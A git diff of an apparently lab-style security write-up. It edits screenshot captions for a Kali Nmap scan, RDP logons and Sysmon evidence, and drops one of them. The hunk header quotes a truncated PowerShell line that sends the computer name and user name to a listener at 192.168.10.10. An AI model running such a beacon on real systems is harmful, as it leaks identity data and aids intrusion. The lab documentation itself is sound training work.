@@ -491,7 +491,6 @@ $client.GetAsync("http://192.168.10.10:8000/?host=$env:COMPUTERNAME&user=$env:US
 
 1. `screenshots/01-nmap-scan.png` — Kali Nmap scan
    <img width="975" height="454" alt="image" src="https://github.com/user-attachments/assets/eba75d25-d91c-4a1a-a68b-92f63d9badf1" />
-2. `screenshots/02-successful-rdp.png` — successful RDP Logon Type 10 events
+2. `screenshots/02-successful-rdp.png` — successful RDP 
    <img width="975" height="503" alt="image" src="https://github.com/user-attachments/assets/7a450047-a366-486e-a8d6-b660326659b6" />
-3. `screenshots/03-system-discovery.png` — Sysmon discovery-command evidence
-   <img width="975" height="505" alt="image" src="https://github.com/user-attachments/assets/bdbedf70-30ee-4c4b-ab35-6c3b6187a9c0" />
+
